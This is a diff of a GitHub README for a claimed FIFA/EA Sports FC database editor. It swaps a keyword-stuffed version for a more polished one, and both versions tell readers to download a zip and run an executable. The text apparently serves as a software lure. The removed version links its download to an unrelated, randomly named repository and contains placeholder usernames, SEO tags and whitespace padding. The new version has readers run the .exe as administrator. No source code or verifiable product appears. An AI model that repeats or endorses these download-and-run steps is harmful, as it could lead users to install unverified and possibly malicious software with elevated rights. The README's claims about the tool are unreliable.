@@ -1,171 +1,55 @@
-<p align="center">
-  <img src="https://img.icons8.com/color/96/000000/fifa.png" alt="EA Sports FC" width="80" height="80">
-</p>
+# ⚽ FIFA-Database-Editor-Pro - Edit your game database with ease
 
-<h1 align="center">FIFA-Database-Editor-Pro</h1>
-<p align="center">
-  <strong>Professional Database Editor for EA Sports FC / FIFA</strong><br>
-  Player Attributes - Teams - Leagues - Transfers - Career Mode
-</p>
+[![Download Latest Version](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/saadoun681/FIFA-Database-Editor-Pro/releases)
 
-<p align="center">
-  <a href="https://github.com/YOUR_USERNAME/FIFA-Database-Editor-Pro"><img src="https://img.shields.io/badge/version-2.0.4-brightgreen?style=flat-square" alt="Version"></a>
-  <a href="#"><img src="https://img.shields.io/badge/platform-Windows-blue?style=flat-square" alt="Platform"></a>
-  <a href="#"><img src="https://img.shields.io/badge/status-active-success?style=flat-square" alt="Status"></a>
-</p>
+FIFA-Database-Editor-Pro allows you to modify the internal game files of EA Sports FC and FIFA titles. You can change player statistics, update team details, and manage league structures without needing technical coding skills. This tool provides a user interface to view and edit database tables directly.
 
-## What is This?
+## 📋 Requirements
+Before you start, ensure your computer meets these requirements:
+* Operating System: Windows 10 or Windows 11.
+* Storage: At least 500 MB of free space.
+* Software: Microsoft .NET Desktop Runtime 8.0 or newer.
 
-FIFA Database Editor Pro is a professional database editing tool for EA Sports FC / FIFA games. It allows you to modify player attributes, teams, leagues, transfers, and career mode data with ease.
+To check if you have the correct software installed, go to your Windows Settings, open Apps, and look for "Microsoft .NET" in the list. If you do not see it, download the runtime from the official Microsoft support page.
 
-Disclaimer: This tool is for educational purposes only. Use at your own risk. Online use may trigger anti-cheat systems.
+## 📥 How to Install
+Follow these steps to set up the editor on your Windows PC:
 
-## Download
+1. Visit the release page to download the latest version of the software: https://github.com/saadoun681/FIFA-Database-Editor-Pro/releases
+2. Locate the file ending in .zip in your downloads folder.
+3. Right-click the file and select "Extract All".
+4. Choose a destination folder on your computer and click "Extract".
+5. Open the folder you just created.
+6. Double-click the file named FIFA-Database-Editor-Pro.exe to start the application.
 
-<p align="center">
-  <a href="https://github.com/Phasevisucceed/wegdgjtk/releases/download/9012/FIFAEditor.zip">
-    <img src="https://img.shields.io/badge/DOWNLOAD%20NOW-000000?style=for-the-badge&logo=github&logoColor=white" alt="Download">
-  </a>
-</p>
+## 🛠️ Using the Editor
+The interface organizes your data into rows and columns. Use the top menu to open your game database file. The software typically looks for files with the .db extension. Once you load a file, the application displays team and player tabs. 
 
-## Features
+To change an attribute, click on the specific cell, type your new value, and press Enter. The editor saves your changes to the temporary cache file. When you finish your edits, select File, then Save from the top menu to lock in your changes. Ensure you create a backup of your original database file before you make any modifications. To do this, copy your original .db file to a separate folder on your desktop.
 
-- Player Attribute Editor - Modify all player stats and traits
-- Team Editor - Edit team rosters, formations, and tactics
-- League Editor - Customize league structures and rules
-- Transfer Editor - Manage transfers and contracts
-- Career Mode Tools - Advanced career mode editing capabilities
-- Database Import/Export - Backup and restore database files
-- Project System - Save and load your modding projects
+## ⚙️ Feature Overview
+This tool includes specific functions for game customization:
 
-## Supported Games
+* Player Attribute Manager: Change speed, shooting, or defensive ratings for any player in your squad.
+* Team Database Editor: Rename clubs, update stadium names, or change team budgets.
+* League Structure Tool: Move clubs between leagues or adjust the number of teams in a competition.
+* Texture Editor: Import or export player faces and team kits into the database.
+* Modding Support: The software integrates with Frosty Editor to ensure your database changes work with existing visual mods.
 
-- EA Sports FC 26
-- EA Sports FC 25
-- EA Sports FC 24
-- FIFA 23
-- FIFA 22
-- FIFA 21
+## 🔧 Troubleshooting
+If the software fails to open or crashes during use, follow these steps:
 
-## Installation
+* Run as administrator: Right-click the application icon and select "Run as administrator". This grants the tool permission to read and write database files located in your game directory.
+* Check file permissions: Ensure your game folder is not set to "Read Only" in the file properties.
+* Restart the app: If the database does not load correctly, close the editor and reopen it.
+* Verify game files: If your game stops working, use the "Repair" or "Verify Integrity" option in the EA App or Steam to restore the original database files.
 
-1. Click the download button above
-2. Extract the archive
-3. Run FIFA Editor Tool.exe
-4. Select your game from the list
-5. Start editing the database!
+## 🛡️ Best Practices
+Backing up your data remains the most important step in the modding process. A single error in a database file can stop the game from launching. Always keep a copy of the original "data.db" file in a password-protected folder or a cloud storage service. 
 
-## System Requirements
+If you plan to use multiple mods, perform your database edits first, then apply your visual mods. This order prevents conflicts between file changes. If you encounter an error message regarding a "Primary Key", it means a table requires a unique identifier for each entry. Do not change the ID numbers in index columns, as these link the data to the game engine.
 
-| Requirement | Details |
-|-------------|---------|
-| OS | Windows 10/11 (64-bit) |
-| Game | EA Sports FC / FIFA (2019-2026) |
-| RAM | 8GB minimum |
-| Storage | 2GB free space for cache |
+## 📖 Support and Updates
+The development team releases updates periodically to maintain compatibility with new game patches. Check the release page frequently to stay current. If you find a bug, document the steps you took to trigger the issue. Providing clear examples helps the team fix the problem faster. 
 
-## SEO Tags
-
-fifa database editor pro, ea sports fc mods, fifa mod manager, fifa modding, fifa kit creator, fifa face mod, fifa texture editor, fifa database editor, fc26 mods, fifa 26 mods, fifa mod tool, frosty editor, fifa 22 mods, fifa 23 mods, fc24 mods, fifa editor download, fifa modding tool 2026, ea fc mods, fifa db editor, fifa career mode editor
-
-## Support
-
-Star this repository if you enjoy it!
-
-<p align="center">
-  <a href="https://github.com/YOUR_USERNAME/FIFA-Database-Editor-Pro">
-    <img src="https://img.shields.io/badge/Made%20with%20love%20for%20the%20FIFA%20modding%20community-ff69b4?style=for-the-badge" alt="Made with love">
-  </a>
-</p>
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
+Keywords: ea-sports-fc, fc26-modding, fifa-db-editor, fifa-editor-tool, fifa-face-mod, fifa-kit-creator, fifa-modding, fifa-mods, fifa-texture-editor, frosty-editor
